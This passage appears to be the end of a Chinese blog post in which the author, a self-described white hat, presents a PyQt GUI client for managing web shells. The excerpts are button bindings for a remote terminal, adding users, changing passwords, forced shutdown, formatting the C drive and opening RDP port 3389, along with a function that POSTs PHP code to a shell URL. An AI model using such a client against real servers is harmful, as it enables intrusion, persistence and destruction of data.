self.Ui.zhixing.clicked.connect(self.shellcommand)  #虚拟终端执行按钮
self.Ui.clearbutton.clicked.connect(self.clearVirtual)  #虚拟终端清空按钮
self.Ui.savejiaoben.clicked.connect(self.SaveJiaoben)  #保存脚本
self.Ui.clearjiaoben.clicked.connect(self.ClearJiaoben) #清空脚本
self.Ui.user.clicked.connect(self.User)  #查询用户
self.Ui.adduser.clicked.connect(self.useraddshow)#添加用户按钮
self.Ui.passwd.clicked.connect(self.changepasswdshow)  # 修改密码
self.Ui.shutdown.clicked.connect(self.Shutdown)  #强制关机
self.Ui.format.clicked.connect(self.Format)  #格式化C盘
self.Ui.open3389.clicked.connect(self.Open3389)  # 开启3389
self.Ui.chinese.clicked.connect(self.Chinese) #中文检测
self.Ui.update.clicked.connect(self.Update)  #检查更新
self.Ui.loveme.clicked.connect(self.Loveme)  #联系作者
```


POST请求函数

```python
postData = urllib.parse.urlencode(phpcode).encode("utf-8","ignore")
req = urllib.request.Request(shell[0], postData, headers)
# 发起请求
response = urllib.request.urlopen(req)
#data = (response.read()).decode('utf-8')
return (response.read())
```

还有一个动态显示时间的函数

```python
def showtime(self):  #显示时间
    datetime = QDateTime.currentDateTime()
    text = datetime.toString("yyyy-MM-dd hh:mm:ss")
    self.Ui.timelabel.setText(text)
```

Pyqt的源文件我也放在里面了，你们可以尽情修改。注释的话，我感觉已经特别详细了。不多解释了，自己看吧。

qianxiao996 ----- 一名什么也不精通的白帽子。

博客地址：https://me.csdn.net/qq_36374896